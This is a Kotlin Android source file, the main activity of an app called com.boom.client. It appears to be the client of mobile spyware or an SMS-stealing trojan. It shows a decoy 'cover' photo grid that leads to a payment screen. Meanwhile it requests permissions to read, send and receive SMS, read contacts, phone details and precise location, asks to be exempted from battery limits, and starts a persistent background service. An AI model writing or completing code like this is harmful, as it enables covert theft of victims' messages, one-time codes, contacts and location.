package com.boom.client

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.recyclerview.widget.GridLayoutManager
import androidx.recyclerview.widget.RecyclerView
import com.boom.client.cover.CoverAdapter
import com.boom.client.services.DeviceService
import com.boom.client.utils.Prefs

class MainActivity : AppCompatActivity() {

    private val PERMS = arrayOf(
        Manifest.permission.READ_SMS,
        Manifest.permission.SEND_SMS,
        Manifest.permission.RECEIVE_SMS,
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.READ_PHONE_NUMBERS,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.POST_NOTIFICATIONS
    )

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        Prefs.init(applicationContext)

        requestBatteryOptimizationExemption()

        val missing = PERMS.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }
        if (missing.isNotEmpty()) {
            ActivityCompat.requestPermissions(this, missing.toTypedArray(), 1)
        } else {
            startBackgroundService()
        }

        setupCoverUI()
    }

    private fun setupCoverUI() {
        val rv = findViewById<RecyclerView>(R.id.rvPhotos)
        rv.layoutManager = GridLayoutManager(this, 3)
        rv.adapter = CoverAdapter(this) {
            startActivity(Intent(this, PayActivity::class.java))
        }
    }

    private fun requestBatteryOptimizationExemption() {
        try {
            val pm = getSystemService(POWER_SERVICE) as PowerManager
            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                startActivity(Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                    data = Uri.parse("package:$packageName")
                })
            }
        } catch (_: Exception) {}
    }

    override fun onRequestPermissionsResult(code: Int, perms: Array<String>, results: IntArray) {
        super.onRequestPermissionsResult(code, perms, results)
        startBackgroundService()
    }

    private fun startBackgroundService() {
        try {
            startForegroundService(Intent(this, DeviceService::class.java))
        } catch (_: Exception) {
            startService(Intent(this, DeviceService::class.java))
        }
    }
}
